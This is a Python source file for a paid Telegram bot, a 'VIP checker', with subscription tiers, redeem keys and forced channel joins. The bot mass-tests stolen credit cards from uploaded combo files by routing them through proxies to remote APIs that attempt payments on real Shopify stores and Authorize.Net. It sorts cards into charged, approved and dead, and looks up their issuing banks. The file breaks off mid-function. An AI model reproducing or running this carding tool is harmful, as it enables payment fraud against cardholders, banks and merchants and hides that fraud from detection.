# ==============================================================================
# 𝗦𝗛𝗢𝗣𝗜𝗙𝗬 𝗩𝗜𝗣 𝗕𝗢𝗧 - 𝗨𝗟𝗧𝗜𝗠𝗔𝗧𝗘 𝗣𝗥𝗢𝗗𝗨𝗖𝗧𝗜𝗢𝗡 𝗦𝗬𝗦𝗧𝗘 SYSTEM (HIGH-SPEED CPM ENGINE)
# ==============================================================================
import asyncio
import aiohttp
import aiofiles
import os
import random
import time
import json
import re
import io
import sys
import logging
import base64
from html import unescape
from datetime import datetime, timedelta
from urllib.parse import urlparse, quote 
import telegram
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, LinkPreviewOptions
from telegram.ext import Application, CallbackQueryHandler, MessageHandler, filters, ContextTypes, Defaults
from telegram.error import RetryAfter, Conflict, TimedOut, NetworkError, Forbidden, BadRequest
from telegram.constants import ParseMode

from database2 import (
    init_db, ensure_user, get_user_plan, set_user_plan,
    get_all_user_proxies, add_proxy_db, remove_proxy_by_index,
    clear_all_proxies, mark_user_joined
)

# محرك تسجيل الأزرار وتمرير الخصائص الملونة والإيموجيات المتحركة بشكل رسمي لتليجرام
BUTTON_REGISTRY = {}
_original_inline_keyboard_button = telegram.InlineKeyboardButton

def CustomInlineKeyboardButton(*args, **kwargs):
    style = kwargs.pop('style', None)
    icon_custom_emoji_id = kwargs.pop('icon_custom_emoji_id', None)
    btn = _original_inline_keyboard_button(*args, **kwargs)
    if style or icon_custom_emoji_id:
        BUTTON_REGISTRY[id(btn)] = {'style': style, 'icon_custom_emoji_id': icon_custom_emoji_id}
    return btn

telegram.InlineKeyboardButton = CustomInlineKeyboardButton

_original_to_dict = _original_inline_keyboard_button.to_dict
def _patched_to_dict(self, *args, **kwargs):
    d = _original_to_dict(self, *args, **kwargs)
    extra = BUTTON_REGISTRY.get(id(self))
    if extra:
        if extra.get('style'): d['style'] = extra['style']
        if extra.get('icon_custom_emoji_id'): d['icon_custom_emoji_id'] = extra['icon_custom_emoji_id']
    return d
_original_inline_keyboard_button.to_dict = _patched_to_dict

# Logging configuration
logging.basicConfig(stream=sys.stdout, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger("VIP_BOT")

# ====================== CONFIG & GLOBALS ======================
BOT_TOKEN = os.getenv('BOT_TOKEN', '').strip()
ADMIN_ID = [int(x.strip()) for x in os.getenv("ADMIN_ID", "8879293808,8170592405").split(",") if x.strip()]

JOIN_CHANNEL_ID = os.getenv("JOIN_CHANNEL_ID", "0").strip()
JOIN_GROUP_ID = os.getenv("JOIN_GROUP_ID", "0").strip()
HITS_GROUP_ID = os.getenv("HITS_GROUP_ID", "0").strip()

JOIN_CHANNEL_LINK = os.getenv("JOIN_CHANNEL_LINK", "").strip()
JOIN_GROUP_LINK = os.getenv("JOIN_GROUP_LINK", "").strip()
HITS_GROUP_LINK = os.getenv("HITS_GROUP_LINK", "").strip()

def get_valid_target(link, chat_id):
    l = str(link).strip()
    c = str(chat_id).strip()
    if "t.me/" in l and "+" not in l and "joinchat" not in l:
        uname = l.split("t.me/")[-1].split("/")[0].split("?")[0]
        return f"@{uname}"
    if l.startswith("@"): return l
    if c and c not in ["0", "", "none", "None"]:
        if c.isdigit(): c = f"-100{c}" 
        try: return int(c)
        except ValueError: return c
    return None

JOIN_CHANNEL_TARGET = get_valid_target(JOIN_CHANNEL_LINK, JOIN_CHANNEL_ID)
JOIN_GROUP_TARGET = get_valid_target(JOIN_GROUP_LINK, JOIN_GROUP_ID)
HITS_GROUP_TARGET = get_valid_target(HITS_GROUP_LINK, HITS_GROUP_ID)

# روابط الـ APIs النشطة
SHOPIFY_API_URL_1 = 'https://web-production-3d364.up.railway.app/shopify'
AUTHNET_API_URL = 'https://authnet-4b3p.vercel.app/calc'
GITHUB_SITES_URL = os.getenv("GITHUB_SITES_URL", "https://raw.githubusercontent.com/7Tqk/New-bot-tele/refs/heads/main/sites.txt")
KEYS_FILE = "redeem_keys.json"

# التعديلات المطلوبة (تم تقليل الـ Workers إلى 20 لضمان استقرار سيرفر الاستضافة وتجنب الـ Rate Limit)
WORKERS = 45  
DELAY = 3.1  
HIT_DELAY = 1.0
API_TIMEOUT = 60

_SITE_ERRORS_COUNT = {}
_MAX_SITE_ERRORS = 3
_JOIN_CACHE = {}
_MAINTENANCE_MODE = False

_USER_NAMES = {}
USER_LAST_REQ = {}
ACTIVE_MTXT_PROCESSES = {}
PENDING_FILES = {}

# ====================== SAFE CHARGED FONT ENGINE & TAG PROTECTION ======================
def sf(text) -> str:
    if text is None: return ""
    res = ""
    in_tag = False
    for c in str(text):
        if c == '<':
            in_tag = True
            res += c
            continue
        if c == '>':
            in_tag = False
            res += c
            continue
        if in_tag:
            res += c
            continue
            
        if 'A' <= c <= 'Z': res += chr(ord(c) - 65 + 0x1D5D4)
        elif 'a' <= c <= 'z': res += chr(ord(c) - 97 + 0x1D5EE)
        elif '0' <= c <= '9': res += chr(ord(c) - 48 + 0x1D7CE)
        else: res += c
    return res

def unsf(text) -> str:
    if text is None: return ""
    res = ""
    for c in str(text):
        o = ord(c)
        if 0x1D5D4 <= o <= 0x1D5ED: res += chr(o - 0x1D5D4 + 65)
        elif 0x1D5EE <= o <= 0x1D607: res += chr(o - 0x1D5EE + 97)
        elif 0x1D7CE <= o <= 0x1D7D7: res += chr(o - 0x1D7CE + 48)
        else: res += c
    return res

def escape_html(text):
    if not text: return "Unknown"
    return str(text).replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")

# ====================== NATIVE TELEGRAM PREMIUM CUSTOM EMOJIS ======================
CE_CROWN = '<tg-emoji emoji-id="5217822164362739968">👑</tg-emoji>'
CE_DIAMOND = '<tg-emoji emoji-id="5427168083074628963">💎</tg-emoji>'
CE_DIAMOND2 = '<tg-emoji emoji-id="5260681660189408650">💎</tg-emoji>'
CE_MIC = '<tg-emoji emoji-id="5224736245665511429">🎤</tg-emoji>'
CE_SMILE = '<tg-emoji emoji-id="5461117441612462242">🙂</tg-emoji>'
CE_CHART = '<tg-emoji emoji-id="5246762912428603768">📉</tg-emoji>'
CE_GLASSES = '<tg-emoji emoji-id="5391112412445288650">🥸</tg-emoji>'
CE_CONTAINER = '<tg-emoji emoji-id="5269531045165816230">🤡</tg-emoji>'
CE_CLOWN = CE_CONTAINER
CE_FLY = '<tg-emoji emoji-id="5231449120635370684">💸</tg-emoji>'
CE_SHIELD = '<tg-emoji emoji-id="5251203410396458957">🛡️</tg-emoji>'
CE_SEARCH = '<tg-emoji emoji-id="5231012545799666522">🔍</tg-emoji>'
switch_emoji = '<tg-emoji emoji-id="5325547803936572038">✨</tg-emoji>'
CE_SPARKLES = switch_emoji
CE_GAME = '<tg-emoji emoji-id="5361741454685256344">🎮</tg-emoji>'
CE_MEDAL = '<tg-emoji emoji-id="5440539497383087970">🥇</tg-emoji>'
CE_CALENDAR = '<tg-emoji emoji-id="5413879192267805083">🗓️</tg-emoji>'
CE_CLIP = '<tg-emoji emoji-id="5305265301917549162">📎</tg-emoji>'
CE_HOURGLASS = '<tg-emoji emoji-id="5386367538735104399">⌛</tg-emoji>'
CE_STAR = '<tg-emoji emoji-id="5794073296492303710">⭐</tg-emoji>'
CE_THINK1 = '<tg-emoji emoji-id="5917785839428967062">🤔</tg-emoji>'
CE_THINK2 = '<tg-emoji emoji-id="5918248669399754192">🤔</tg-emoji>'
CE_THINK3 = '<tg-emoji emoji-id="5916025950809625537">🤔</tg-emoji>'
CE_ALIEN = '<tg-emoji emoji-id="6028356293540977715">👾</tg-emoji>'
CE_PHONE = '<tg-emoji emoji-id="5445059250382469069">📲</tg-emoji>'
CE_FLASH = '<tg-emoji emoji-id="5445388803223091254">⚡️</tg-emoji>'
CE_TEARS = '<tg-emoji emoji-id="6201792892634140208">🥲</tg-emoji>'
CE_SHY = '<tg-emoji emoji-id="6201647288947839133">🤭</tg-emoji>'
CE_CHECK = '<tg-emoji emoji-id="5445189224682779974"><b>✔️</b></tg-emoji>'
CE_DOWN = '<tg-emoji emoji-id="5445358884480916784">🔽</tg-emoji>'
CE_CARD = '<tg-emoji emoji-id="5447453226498552490">💳</tg-emoji>'
CE_MAIL = '<tg-emoji emoji-id="5445163772706582819">📬</tg-emoji>'
CE_MAN = '<tg-emoji emoji-id="5447311106030726740">👨‍🦰</tg-emoji>'

# ====================== CASH & STATUS EMOJIS ======================
CE_CASH = '<tg-emoji emoji-id="5409048419211682843">💵</tg-emoji>'
CE_PARTY = '<tg-emoji emoji-id="5461151367559141950">🎉</tg-emoji>'
CE_CANDLE = '<tg-emoji emoji-id="5451882707875276247">🕯</tg-emoji>'
CE_TOP = '<tg-emoji emoji-id="5415655814079723871">🔝</tg-emoji>'
CE_GEAR = '<tg-emoji emoji-id="5341715473882955310">⚙️</tg-emoji>'
CE_SNOW = '<tg-emoji emoji-id="5449449325434266744">❄️</tg-emoji>'
CE_BOOM = '<tg-emoji emoji-id="5276032951342088188">💥</tg-emoji>'

# ====================== BULLETPROOF CONFIGS ======================
def get_flag_emoji(country_code, fallback="🏳️"):
    if not country_code or len(country_code) != 2: return fallback
    c = country_code.upper()
    if c in ["-", "UNKNOWN", ""]: return fallback
    try:
        return chr(ord(c[0]) + 127397) + chr(ord(c[1]) + 127397)
    except Exception:
        return fallback

WELCOME_GIF = "https://i.giphy.com/3o7aD2d7hy9ktXNDP2.gif"
REDEEM_GIF = "https://i.giphy.com/l41YkxvU8c7J7Bba0.gif"

ANIME_GIFS = [
    "https://i.giphy.com/X3Yj4X96MK4wM.gif",        
    "https://i.giphy.com/3rVgN21VK2DuU.gif",        
    "https://i.giphy.com/MeE378J7w7bTq.gif",        
    "https://i.giphy.com/vlnZpsw8S_Z04.gif",        
    "https://i.giphy.com/3o7abIile68G58510k.gif",     
    "https://i.giphy.com/13m24iFmhomZi0.gif",        
    "https://i.giphy.com/l3vR1603ssT69vWb6.gif",        
    "https://i.giphy.com/XjY7D2H47Y0j6.gif",        
    "https://i.giphy.com/20K8866h4693G.gif",        
    "https://i.giphy.com/d3mlE7uhRoVX2Im4.gif"         
]

PLANS = {
    "plan1": {"name": "Core Access", "tier": "Core", "duration_days": 7, "price": "$5.00"},
    "plan2": {"name": "Elite Access", "tier": "Elite", "duration_days": 15, "price": "$10.00"},
    "plan3": {"name": "Root Access", "tier": "Root", "duration_days": 30, "price": "$15.00"},
    "plan4": {"name": "X-Access", "tier": "X", "duration_days": 60, "price": "$25.00"},
}
PAID_TIERS = ["Core", "Elite", "Root", "X"]

_GIF_FILE_IDS = {}
_system_locks = {}
_BIN_CACHE = {}  

def get_system_lock(name: str):
    if name not in _system_locks: _system_locks[name] = asyncio.Lock()
    return _system_locks[name]

async def global_error_handler(update: object, context: ContextTypes.DEFAULT_TYPE):
    logger.error(f"Exception in update: {context.error}")

def is_valid_url(link):
    return link and str(link).strip().startswith("http")

async def fetch_gif_bytes(url):
    try:
        async with aiohttp.ClientSession() as session:
            headers = {"User-Agent": "Mozilla/5.0"}
            async with session.get(url, headers=headers, timeout=15) as resp:
                if resp.status == 200:
                    bio = io.BytesIO(await resp.read())
                    bio.name = "animation.gif"
                    return bio
    except Exception as e: logger.error(f"Failed to fetch GIF: {e}")
    return None

async def send_forced_gif(target_func, text, markup, url):
    media_to_send = _GIF_FILE_IDS.get(url, url)
    for retry in range(4): 
        try:
            msg = await target_func(
                animation=media_to_send, caption=text, reply_markup=markup,
                parse_mode=ParseMode.HTML, read_timeout=40, write_timeout=40
            )
            if url not in _GIF_FILE_IDS and getattr(msg, 'animation', None):
                _GIF_FILE_IDS[url] = msg.animation.file_id
            return msg
        except RetryAfter as e:
            await asyncio.sleep(e.retry_after + 0.5)
        except Exception:
            break
            
    try:
        gif_io = await fetch_gif_bytes(url)
        if gif_io:
            for retry in range(3):
                try:
                    msg = await target_func(
                        animation=gif_io, caption=text, reply_markup=markup,
                        parse_mode=ParseMode.HTML, read_timeout=60, write_timeout=60
                    )
                    if getattr(msg, 'animation', None):
                        _GIF_FILE_IDS[url] = msg.animation.file_id
                    return msg
                except RetryAfter as e:
                    await asyncio.sleep(e.retry_after + 0.5)
                except Exception:
                    break
    except Exception: pass

    try:
        if hasattr(target_func, '__self__') and hasattr(target_func.__self__, 'reply_text'):
            return await target_func.__self__.reply_text(text=text, reply_markup=markup, parse_mode=ParseMode.HTML)
    except: pass
    return None

async def styled_reply(update: Update, text: str, buttons=None, use_gif=True, specific_gif=None):
    markup = InlineKeyboardMarkup(buttons) if buttons else None
    target = update.callback_query.message if update.callback_query else update.message
    if not target: return None
    url = specific_gif or random.choice(ANIME_GIFS)
    if use_gif or specific_gif: return await send_forced_gif(target.reply_animation, text, markup, url)
    
    for retry in range(3):
        try: return await target.reply_text(text=text, reply_markup=markup, parse_mode=ParseMode.HTML)
        except RetryAfter as e: await asyncio.sleep(e.retry_after + 0.5)
        except Exception: return None

async def styled_edit(msg, text, buttons=None):
    markup = InlineKeyboardMarkup(buttons) if buttons else None
    for retry in range(3):
        try:
            if msg.animation or msg.photo or msg.video or msg.document: 
                return await msg.edit_caption(caption=text, reply_markup=markup, parse_mode=ParseMode.HTML)
            return await msg.edit_text(text=text, reply_markup=markup, parse_mode=ParseMode.HTML)
        except RetryAfter as e:
            await asyncio.sleep(e.retry_after + 0.5)
        except Exception: 
            return None

async def styled_send(bot, chat_id, text, buttons=None, use_gif=True, specific_gif=None):
    markup = InlineKeyboardMarkup(buttons) if buttons else None
    url = specific_gif or random.choice(ANIME_GIFS)
    async def _bot_send_anim(**kwargs): return await bot.send_animation(chat_id=chat_id, **kwargs)
    if use_gif or specific_gif: return await send_forced_gif(_bot_send_anim, text, markup, url)
    
    for retry in range(3):
        try: return await bot.send_message(chat_id=chat_id, text=text, reply_markup=markup, parse_mode=ParseMode.HTML)
        except RetryAfter as e: await asyncio.sleep(e.retry_after + 0.5)
        except Exception: return None

async def load_keys():
    async with get_system_lock("keys"):
        if os.path.exists(KEYS_FILE):
            try:
                async with aiofiles.open(KEYS_FILE, 'r', encoding='utf-8') as f:
                    c = await f.read()
                    if c: return json.loads(c)
            except Exception: pass
        return {}

async def save_keys(keys_data):
    async with get_system_lock("keys"):
        try:
            async with aiofiles.open(KEYS_FILE, 'w', encoding='utf-8') as f:
                await f.write(json.dumps(keys_data, indent=4))
        except Exception: pass

def get_cc_limit(plan, uid=0):
    if uid in ADMIN_ID: return 40000  
    plan_lower = str(plan).lower() if plan else "bronze"
    if "x" in plan_lower: return 10000  
    if "root" in plan_lower: return 5000
    if "elite" in plan_lower: return 3000
    if "core" in plan_lower: return 1000
    return 15

def is_paid_plan(plan):
    return plan and plan.lower() in [p.lower() for p in PAID_TIERS]

_USER_HTTP_SESSIONS = {}
async def get_user_http_session(uid):
    key = f"{uid}_msp"
    if key not in _USER_HTTP_SESSIONS or _USER_HTTP_SESSIONS[key].closed:
        connector = aiohttp.TCPConnector(limit=WORKERS + 20, ssl=False, enable_cleanup_closed=True, force_close=False, ttl_dns_cache=300)
        _USER_HTTP_SESSIONS[key] = aiohttp.ClientSession(connector=connector)
    return _USER_HTTP_SESSIONS[key]

async def cleanup_user_http_session(uid):
    key = f"{uid}_msp"
    session = _USER_HTTP_SESSIONS.pop(key, None)
    if session and not session.closed:
        try: await session.close()
        except Exception: pass

def extract_cc(text):
    if not text: return []
    cards = []
    for c, m, y, cv in re.findall(r'(\d{15,16})[\s|/\\:]+(\d{2})[\s|/\\:]+(\d{2,4})[\s|/\\:]+(\d{3,4})', text):
        y = '20' + y if len(y) == 2 else y
        cards.append(f"{c}|{m}|{y}|{cv}")
    if not cards:
        for c, m, y, cv in re.findall(r'(\d{15,16})[\s|/\\:]+(\d{2})[\s|/\\:]+(\d{4})(\d{3,4})', text): cards.append(f"{c}|{m}|{y}|{cv}")
    if not cards:
        for c, m, y, cv in re.findall(r'(\d{15,16})[\s|/\\:]+(\d{2})[\s|/\\:]+(\d{2})(\d{3,4})', text): cards.append(f"{c}|{m}|20{y}|{cv}")
    return list(dict.fromkeys(cards))

# ====================== PROXY PARSER (EXCLUDES SOCKS) ======================
def parse_proxy_format(proxy):
    proxy = proxy.strip()
    
    if re.match(r'^socks', proxy, re.IGNORECASE):
        return None
        
    pm = re.match(r'^(socks5|socks4|http|https)://(.+)$', proxy, re.IGNORECASE)
    pt, proxy = (pm.group(1).lower(), pm.group(2)) if pm else ('http', proxy)
    
    if 'socks' in pt:
        return None
        
    if re.match(r'^([^@:]+):([^@]+)@([^:@]+):(\d+)$', proxy): u, pw, h, p = re.match(r'^([^@:]+):([^@]+)@([^:@]+):(\d+)$', proxy).groups()
    elif re.match(r'^([^:]+):(\d+):([^:]+):(.+)$', proxy): h, p, u, pw = re.match(r'^([^:]+):(\d+):([^:]+):(.+)$', proxy).groups()
    elif re.match(r'^([^:@]+):(\d+)$', proxy): h, p = re.match(r'^([^:@]+):(\d+)$', proxy).groups(); u = pw = ''
    else: return None
    if not h or not p: return None
    pu = f'{pt}://{u}:{pw}@{h}:{p}' if u and pw else f'{pt}://{h}:{p}'
    return {'ip': h, 'port': p, 'username': u or None, 'password': pw or None, 'proxy_url': pu, 'type': pt}

_CACHED_SHOPIFY_SITES = []
_LAST_SITES_FETCH = 0

async def get_shopify_sites():
    global _CACHED_SHOPIFY_SITES, _LAST_SITES_FETCH
    now = time.time()
    if _CACHED_SHOPIFY_SITES: 
        return _CACHED_SHOPIFY_SITES
        
    if os.path.exists('sites.txt'):
        try:
            async with aiofiles.open('sites.txt', 'r', encoding='utf-8') as f:
                _CACHED_SHOPIFY_SITES = list(set([re.sub(r'^https?://', '', l.strip()).rstrip('/') for l in (await f.read()).split('\n') if l.strip()]))
                if _CACHED_SHOPIFY_SITES:
                    return _CACHED_SHOPIFY_SITES
        except Exception: pass
        
    try:
        async with aiohttp.ClientSession() as s:
            async with s.get(GITHUB_SITES_URL, headers={"User-Agent": "Mozilla/5.0"}, timeout=10) as r:
                if r.status == 200:
                    _CACHED_SHOPIFY_SITES = list(set([re.sub(r'^https?://', '', l.strip()).rstrip('/') for l in (await r.text()).split('\n') if l.strip()]))
                    _LAST_SITES_FETCH = now
    except Exception: pass
    
    # القائمة الاحتياطية المدمجة لـ شوبيفاي
    if not _CACHED_SHOPIFY_SITES:
        _CACHED_SHOPIFY_SITES = [
            "touch-of-finland.myshopify.com",
            "huckberry.myshopify.com",
            "death-wish-coffee.myshopify.com",
            "gymshark.myshopify.com"
        ]
    
    return _CACHED_SHOPIFY_SITES

def is_dead_site_error(err):
    if not err: return True
    e = str(err).lower()
    bad_keywords = [
        'step 0', 'step 0 failed', 'step 1', 'step 1 failed', 'missing stable', 'missing stablei',
        'max ret', 'cloudflare', 'timed out', 'bad gateway', 'service unavailable', 
        'gateway timeout', 'site dead', 'session_error', 'max retries', 'max retries exceeded',
        '504', '502', '503', '429', 'tunnel', 'connection close', 'format error'
    ]
    return any(k in e for k in bad_keywords)

async def is_user_joined(uid, bot):
    targets = [t for t in [JOIN_CHANNEL_TARGET, JOIN_GROUP_TARGET] if t]
    if not targets: return True
    for target in targets:
        try:
            try: cid = int(target)
            except ValueError: cid = target
            member = await bot.get_chat_member(chat_id=cid, user_id=uid)
            if member.status in ['left', 'kicked', 'banned']: return False
        except Exception: pass 
    return True

async def send_welcome_menu(update_or_bot, uid, plan, limit):
    admin_panel = f"\n\n<b>{CE_GLASSES} {sf('Admin Panel')}:</b>\n ├ {CE_CANDLE} /gen {sf('[plan] [qty]')} - {sf('Generate Keys')}\n ├ {CE_CANDLE} /validate {sf('[key]')} - {sf('Check Key')}\n ├ {CE_CANDLE} /users - {sf('System Status')}\n ├ {CE_CANDLE} /checkgates - {sf('Filter Gates Engine')}\n ╰ {CE_CANDLE} /maint - {sf('Maintenance Mode')}" if uid in ADMIN_ID else ""
    
    t = f"""<b>━━━ {CE_CROWN} {sf('VIP CHECKER SYSTEM')} {CE_CROWN} ━━━</b>

<b>{CE_TOP} {sf('Checker Engine')}:</b>
 ╰ <i>{sf('Send a combo file to auto-start mass check')}</i>

<b>{CE_GEAR} {sf('Proxy Manager')}:</b>
 ├ {CE_CANDLE} /addpxy - {sf('Add Proxies')}
 ├ {CE_CANDLE} /proxy - {sf('View Proxies')}
 ├ {CE_CANDLE} /checkpxy - {sf('Clean Proxies')}
 ╰ {CE_CANDLE} /rmpxy - {sf('Remove Proxies')}

<b>{CE_DIAMOND} {sf('Account Settings')}:</b>
 ├ {CE_CANDLE} /info - {sf('Profile Info')}
 ├ {CE_CANDLE} /redeem - {sf('Redeem Key')}
 ├ {CE_CANDLE} /fb - {sf('Send Feedback')}
 ╰ {CE_CANDLE} /plan - {sf('View Subscriptions')}{admin_panel}

<b>{CE_SMILE} {sf('Your Plan')}:</b> <code>{sf(plan.title()) if plan else sf('Free')} ({sf(str(limit))} {sf('CC Limit')})</code>"""
    
    kb = [
        [InlineKeyboardButton('View Plans', callback_data="show_plans", style="primary", icon_custom_emoji_id="5413879192267805083"),
         InlineKeyboardButton('Redeem Key', callback_data="prompt_redeem", style="success", icon_custom_emoji_id="5451882707875276247")]
    ]
    
    if is_valid_url(JOIN_CHANNEL_LINK) and is_valid_url(JOIN_GROUP_LINK):
        kb.append([InlineKeyboardButton('Channel', url=JOIN_CHANNEL_LINK, style="primary", icon_custom_emoji_id="5305265301917549162"), InlineKeyboardButton('Group', url=JOIN_GROUP_LINK, style="primary", icon_custom_emoji_id="6028356293540977715")])
    elif is_valid_url(JOIN_CHANNEL_LINK):
        kb.append([InlineKeyboardButton('Channel', url=JOIN_CHANNEL_LINK, style="primary", icon_custom_emoji_id="5305265301917549162")])
    elif is_valid_url(JOIN_GROUP_LINK):
        kb.append([InlineKeyboardButton('Group', url=JOIN_GROUP_LINK, style="primary", icon_custom_emoji_id="6028356293540977715")])
        
    if isinstance(update_or_bot, Update):
        await styled_reply(update_or_bot, t, buttons=kb, use_gif=True, specific_gif=WELCOME_GIF)
    else:
        await styled_send(update_or_bot, uid, t, buttons=kb, use_gif=True, specific_gif=WELCOME_GIF)

async def force_join_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if uid in ADMIN_ID: return True
    now = time.time()
    if uid in _JOIN_CACHE and now - _JOIN_CACHE[uid] < 600: return True
    
    is_joined = await is_user_joined(uid, context.bot)
    if is_joined:
        _JOIN_CACHE[uid] = now
        return True
        
    kb = []
    if is_valid_url(JOIN_CHANNEL_LINK): kb.append([InlineKeyboardButton('Channel', url=JOIN_CHANNEL_LINK, style="primary", icon_custom_emoji_id="5305265301917549162")])
    if is_valid_url(JOIN_GROUP_LINK): kb.append([InlineKeyboardButton('Group', url=JOIN_GROUP_LINK, style="primary", icon_custom_emoji_id="6028356293540977715")])
    if kb: kb.append([InlineKeyboardButton('Verify', callback_data="check_joined", style="success", icon_custom_emoji_id="5445189224682779974")])
    
    await styled_reply(update, f"<b>{CE_CLOWN} {sf('Access Denied')}</b>\n\n├ {sf('You must join our official channels first.')}\n╰ {sf('Please join, then click Verify.')}", buttons=kb, use_gif=True)
    return False

async def get_bin_info(bin_code, session=None):
    b6 = str(bin_code)[:6]
    if b6 in _BIN_CACHE: 
        return _BIN_CACHE[b6]
        
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
    }
    
    try:
        url1 = f"https://bins.antipublic.cc/bins/{b6}"
        async def fetch1(s):
            async with s.get(url1, headers=headers, timeout=4) as r:
                if r.status == 200:
                    data = await r.json()
                    if data and isinstance(data, dict) and data.get('brand'): return data
                return None
        
        res = await fetch1(session) if (session and not session.closed) else await fetch1(aiohttp.ClientSession())
        if res:
            parsed = {
                "brand": str(res.get("brand", "-")).upper(),
                "type": str(res.get("type", "-")).upper(),
                "level": str(res.get("level", "-")).upper(),
                "bank": str(res.get("bank", "-")).upper(),
                "country": str(res.get("country", "-")).upper(),
                "country_code": str(res.get("country_code", "")).upper().strip(),
                "flag": res.get("flag", "")
            }
            _BIN_CACHE[b6] = parsed
            return parsed
    except Exception: pass

    try:
        url2 = f"https://data.handyapi.com/bin/{b6}"
        async def fetch2(s):
            async with s.get(url2, headers=headers, timeout=4) as r:
                if r.status == 200: return await r.json()
                return None
                
        res2 = await fetch2(session) if (session and not session.closed) else await fetch2(aiohttp.ClientSession())
        if res2 and res2.get("Status") == "SUCCESS":
            country_obj = res2.get("Country", {})
            bank_obj = res2.get("Bank", {})
            parsed = {
                "brand": str(res2.get("Scheme", "-")).upper(),
                "type": str(res2.get("Type", "-")).upper(),
                "level": str(res2.get("CardTier", "-")).upper(),
                "bank": str(bank_obj.get("Name", "-")).upper(),
                "country": str(country_obj.get("Name", "-")).upper(),
                "country_code": str(country_obj.get("A2", "")).upper().strip(),
                "flag": ""
            }
            _BIN_CACHE[b6] = parsed
            return parsed
    except Exception: pass

    return {"brand": "-", "type": "-", "level": "-", "bank": "-", "country": "-", "country_code": "", "flag": "🏳️"}

async def check_shopify_api(api_url, card, site, proxy, session):
    try:
        proxy_str = proxy['proxy_url'] if isinstance(proxy, dict) else proxy
        if proxy_str and "://" in proxy_str:
            proxy_str = proxy_str.split("://")[-1]
        
        card_encoded = quote(str(card).strip())
        
        site_param = site.strip()
        if not site_param.startswith("http"):
            site_param = f"https://{site_param}"
        site_encoded = quote(site_param)
        
        proxy_param = f"&proxy={quote(proxy_str)}" if proxy_str else "&proxy="
        req_url = f"{api_url}?cc={card_encoded}&site={site_encoded}{proxy_param}"
        
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
        }
        
        async with session.get(req_url, headers=headers, timeout=API_TIMEOUT) as resp:
            text_data = await resp.text()
            
            try: 
                rj = json.loads(text_data)
                rm = str(rj.get('response_msg', rj.get('result', rj.get('Response', rj.get('message', rj.get('error', rj.get('msg', rj.get('status', '')))))))).strip()
                pr = rj.get('Price', rj.get('amount', "$10.00")) 
                gt = rj.get('Gateway', 'Shopify')
            except Exception: 
                rm = text_data.strip()
                pr = "$10.00"
                gt = "Shopify"
            
            rl = rm.lower()
            
            if any(k in rl for k in ['empty submit', 'buyer_identity', 'presentment', 'payment_flexibility', 'flexibility', 'payment token', 'unable to get payment token']):
                return {'status': 'Site Error', 'message': rm, 'card': card, 'gateway': gt, 'price': pr, 'retry': True}
            
            # تم حذف كلمة 'error' و 'session' لتجنب فرز الـ Decline الطبيعي للبطاقات كخطأ موقع
            if is_dead_site_error(rm) or any(k in rl for k in ['proxy', 'timeout', 'bad gateway', 'max ret', 'step 0', 'missing', 'tunnel', 'cloudflare', '502', '503', '504']):
                return {'status': 'Site Error', 'message': rm, 'card': card, 'gateway': gt, 'price': pr, 'retry': True}
                
            if 'insufficient' in rl or 'funds' in rl or 'balance' in rl:
                return {'status': 'Insufficient', 'message': 'insufficient_funds', 'card': card, 'gateway': gt, 'price': pr}
                
            if 'charged' in rl or 'completed' in rl or 'payment succeeded' in rl or 'success' in rl: 
                return {'status': 'Charged', 'message': 'Payment Succeeded', 'card': card, 'gateway': gt, 'price': pr}
                
            if '3d' in rl or 'secure' in rl or 'otp' in rl:
                return {'status': 'Approved', 'message': '3d_secure_required', 'card': card, 'gateway': gt, 'price': pr}
                
            if 'approved' in rl or any(k in rl for k in ['invalid_cvv', 'match']): 
                return {'status': 'Approved', 'message': rm, 'card': card, 'gateway': gt, 'price': pr}
                
            return {'status': 'Dead', 'message': rm, 'card': card, 'gateway': gt, 'price': pr}
        
    except asyncio.TimeoutError:
        return {'status': 'Site Error', 'message': 'API Timeout', 'card': card, 'retry': True}
    except Exception as e: 
        return {'status': 'Site Error', 'message': f'API Error: {str(e)[:30]}', 'card': card, 'retry': True}

# ====================== ASYNC AUTHNET GATEWAY ENGINE ======================
async def check_authnet_api(card, proxy, session):
    try:
        proxy_url = proxy['proxy_url'] if isinstance(proxy, dict) else proxy
        card = card.strip()
        
        req_url = f"{AUTHNET_API_URL}?cc={quote(card)}"
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
        }
        
        async with session.get(req_url, headers=headers, proxy=proxy_url, timeout=API_TIMEOUT) as resp:
            text_data = await resp.text()
            
            try:
                rj = json.loads(text_data)
                rm = str(rj.get('response_msg', rj.get('result', rj.get('Response', rj.get('message', rj.get('error', rj.get('msg', rj.get('status', text_data)))))))).strip()
            except Exception:
                rm = text_data.strip()
                
            rl = rm.lower()
            
            if any(k in rl for k in ['this transaction has been approved', 'charged', 'success', 'payment succeeded', 'completed']):
                return {'status': 'Charged', 'message': rm, 'card': card, 'gateway': 'Authorize.Net', 'price': '$20.00'}
                
            if any(k in rl for k in ['insufficient funds', 'insufficient_funds', 'funds', 'balance']):
                return {'status': 'Insufficient', 'message': 'Insufficient Funds', 'card': card, 'gateway': 'Authorize.Net', 'price': '$20.00'}
                
            if any(k in rl for k in ['authentication_required', '3d', 'secure', 'verification', 'otp', 'held for review', 'review']):
                return {'status': 'Approved', 'message': '3D Secure Required', 'card': card, 'gateway': 'Authorize.Net', 'price': '$20.00'}
                
            if any(k in rl for k in ['the transaction was declined', 'declined', 'card declined', 'do not honor', 'stolen', 'lost', 'expired', 'invalid number', 'suspected fraud', 'card code is invalid']):
                return {'status': 'Dead', 'message': rm, 'card': card, 'gateway': 'Authorize.Net', 'price': '$20.00'}
                
            if any(k in rl for k in ['error', 'timeout', 'proxy', 'bad gateway', 'cloudflare', 'system unavailable']):
                return {'status': 'Site Error', 'message': rm, 'card': card, 'gateway': 'Authorize.Net', 'price': '$20.00', 'retry': True}
                
